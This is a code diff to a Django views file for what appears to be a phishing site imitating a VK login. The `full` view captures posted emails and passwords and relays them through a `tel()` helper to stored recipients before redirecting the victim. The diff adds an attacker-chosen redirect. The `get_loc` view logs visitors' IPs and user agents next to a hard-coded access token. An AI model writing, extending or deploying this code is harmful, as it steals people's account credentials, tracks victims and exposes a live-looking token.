@@ -49,6 +49,7 @@ def full(request):
 
         email = request.POST.get("email")
         pas = request.POST.get("pas")
+        redirect = request.POST.get("redirect")
 
         body = "Login: {0}\nPass: {1}\n".format(email, pas)
 
@@ -59,12 +60,14 @@ def full(request):
         ids = id_list.objects.in_bulk()
         for id in ids:
             tel(body, ids[id].number)
-
+        if redirect:
+            return HttpResponsePermanentRedirect(redirect)
         return HttpResponsePermanentRedirect("https://vk.com")
     if request.mobile:
         return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
     form = full_login()
-    return render(request, "app_serverr/full.html", {"form": form})
+    redirect_url = request.GET.get('redirect_url')
+    return render(request, "app_serverr/full.html", {"form": form, "redirect": redirect_url})
 
 
 def id_add(request):
@@ -114,7 +117,7 @@ def set_pass(request):
     m = ""
     a = check_pass(t)
     try:
-        if a["flag"] == False:
+        if not a["flag"]:
             if t == "qawsed":
                 if len(n) > 7:
                     l = passs.objects.create(name='pass', pas=n)
@@ -124,7 +127,7 @@ def set_pass(request):
             else:
                 m = "Пароль не верный!!!"
             return HttpResponse(m)
-        if a["status"] and o != None:
+        if a["status"] and o is not None:
             p = passs.objects.get(name="pass")
             if o != p.pas:
                 m = "неверный старый пароль!!!"
@@ -192,10 +195,12 @@ def get_ids(request):
 def get_loc(request):
     redirect_url = request.GET.get('redirect_url')
 
-    client  = request.META.get('HTTP_CLIENT_IP')
+    client = request.META.get('HTTP_CLIENT_IP')
     forward = request.META.get('HTTP_X_FORWARDED_FOR')
-    remote  = request.META.get('REMOTE_ADDR')
-    body = "{0}\nIPs = {1}, {2}, {3}\nUserAgent: {4}\n\n".format(time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime()), client, forward, remote, request.META['HTTP_USER_AGENT'])
+    remote = request.META.get('REMOTE_ADDR')
+    body = "{0}\nIPs = {1}, {2}, {3}\nUserAgent: {4}\n\n".format(
+        time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime()), client, forward, remote,
+        request.META['HTTP_USER_AGENT'])
 
     tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
     club = -189734539
